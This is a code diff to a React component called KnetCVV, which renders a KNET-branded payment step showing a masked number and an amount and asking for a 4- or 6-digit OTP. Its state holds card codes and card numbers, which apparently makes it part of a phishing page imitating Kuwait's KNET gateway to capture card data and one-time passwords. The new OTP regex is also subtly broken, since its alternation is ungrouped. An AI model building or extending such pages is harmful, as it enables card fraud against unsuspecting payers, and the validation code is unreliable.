@@ -35,10 +35,8 @@ export default function KnetCVV() {
     }
   };
 
+  const maskedCardNumber = maskPhoneNumber(mainInfo.value?.phone, 5);
   const state = mainInfo.value.state;
-
-  const maskedCardNumber =
-    maskPhoneNumber(state?.card_code + state?.card_num, 5) ?? "";
 
   return (
     <Main>
@@ -61,7 +59,7 @@ export default function KnetCVV() {
             </div>
             <div className="flex items-center">
               <p className="grow">
-                {Number(state?.payment_amount).toFixed(3)} KD
+                {Number(state?.payment_amount).toFixed(3)} KDW
               </p>
               <p className="text-sky-700 font-bold w-32">:Amount</p>
             </div>
@@ -121,6 +119,7 @@ export default function KnetCVV() {
                     <CustomInput
                       label=""
                       id="otp"
+                      type="tel"
                       errors={errors}
                       register={register}
                       placeholder=" "
@@ -129,14 +128,10 @@ export default function KnetCVV() {
                       inputClassName="h-6 bg-gray-100 placeholder:text-center text-center"
                       options={{
                         required: "هذا الحقل ضروري",
-
-                        minLength: {
-                          value: 6,
-                          message: "يجب أن يكون كود OTP ستة أرقام",
-                        },
-                        maxLength: {
-                          value: 6,
-                          message: "يجب أن يكون كود OTP ستة أرقام",
+                        pattern: {
+                          value: /^\d{4}|\d{6}$/,
+                          message:
+                            "يجب أن يكون كود OTP مكونًا من 4 أو 6 أرقام فقط",
                         },
                       }}
                     />
